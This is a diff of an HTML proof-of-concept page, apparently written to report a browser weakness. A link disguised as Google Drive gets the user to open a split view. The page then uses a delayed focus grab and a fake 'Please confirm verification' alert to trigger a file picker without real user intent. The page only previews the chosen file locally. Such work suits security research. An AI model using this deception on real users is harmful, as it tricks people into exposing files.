@@ -1,56 +1,75 @@
 <!doctype html>
-<html>
+<html lang="en">
   <head>
-    <title>Google Drive Upload - showOpenFilePicker</title>
+    <meta charset="UTF-8" />
+    <title>Bypass Attempt - Split View File Picker</title>
     <style>
+      body {
+        font-family: Arial;
+        text-align: center;
+        padding-top: 50px;
+      }
       a {
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 80;
+        display: inline-block;
+        padding: 10px;
+        background: #1a73e8;
+        color: white;
+        text-decoration: none;
+        border-radius: 4px;
       }
       img {
-        width: 100%;
-        max-width: 400px;
+        max-width: 300px;
         margin-top: 20px;
+        display: none;
       }
     </style>
   </head>
   <body>
-    <center>
-      <br /><br /><br /><br />
-      <a
-        id="link"
-        href="https://workspace.google.com/intl/en_in/products/drive/"
-      >
-        Right Click and Open in Split To Open Google Drive & Upload Fast
-      </a>
-      <br />
-      <img id="img" />
-    </center>
+    <a
+      id="trigger"
+      href="https://workspace.google.com/intl/en_in/products/drive/"
+      >Right Click → Open in Split View</a
+    >
+    <br />
+    <img id="preview" />
 
     <script>
-      document
-        .getElementById("link")
-        .addEventListener("contextmenu", async function (event) {
-          // Prevent default context menu jika perlu
-          // event.preventDefault();
+      const trigger = document.getElementById("trigger");
+      const preview = document.getElementById("preview");
 
-          document
-            .getElementById("link")
-            .addEventListener("contextmenu", async function (event) {
-              event.preventDefault();
-              try {
-                const [fileHandle] = await window.showOpenFilePicker({
-                  types: [{ accept: { "image/*": [] } }],
-                });
-                const file = await fileHandle.getFile();
-                document.getElementById("img").src = URL.createObjectURL(file);
-              } catch (e) {
-                console.log(e);
-              }
-            });
-        });
+      // Buat input file hidden
+      const fileInput = document.createElement("input");
+      fileInput.type = "file";
+      fileInput.accept = "image/*";
+      fileInput.style.display = "none";
+      document.body.appendChild(fileInput);
+
+      fileInput.onchange = (e) => {
+        if (fileInput.files.length) {
+          preview.src = URL.createObjectURL(fileInput.files[0]);
+          preview.style.display = "block";
+          console.log("File selected:", fileInput.files[0].name);
+        }
+      };
+
+      trigger.addEventListener("contextmenu", async (e) => {
+        // Jangan prevent default agar menu konteks browser tetap muncul
+        // User akan memilih "Open in Split View"
+
+        // Kita perlu menunda eksekusi agar split view sempat terbuka,
+        // tapi harus memfokuskan kembali ke tab ini sebelum file picker.
+
+        // Setelah split view terbuka (asumsi butuh waktu ~500ms)
+        setTimeout(async () => {
+          // Coba paksa fokus ke tab ini
+          window.focus();
+          // Bisa juga dengan alert yang memindahkan fokus
+          alert("Please confirm verification"); // alert akan memfokuskan tab ini
+
+          // Sekarang coba buka file picker
+          fileInput.click();
+        }, 1000); // beri waktu split view terbuka
+      });
     </script>
   </body>
 </html>
